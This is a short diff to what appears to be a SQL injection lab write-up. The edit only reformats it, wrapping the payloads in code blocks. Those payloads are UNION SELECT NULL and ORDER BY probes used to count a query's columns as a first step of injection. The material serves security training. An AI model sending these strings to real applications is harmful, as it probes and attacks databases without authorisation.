@@ -9,13 +9,17 @@ To solve the lab, determine the number of columns returned by the query by perfo
 
 ---
 
+```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
+```
 
-# Or
+Or
 
+```sql
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
+```
 
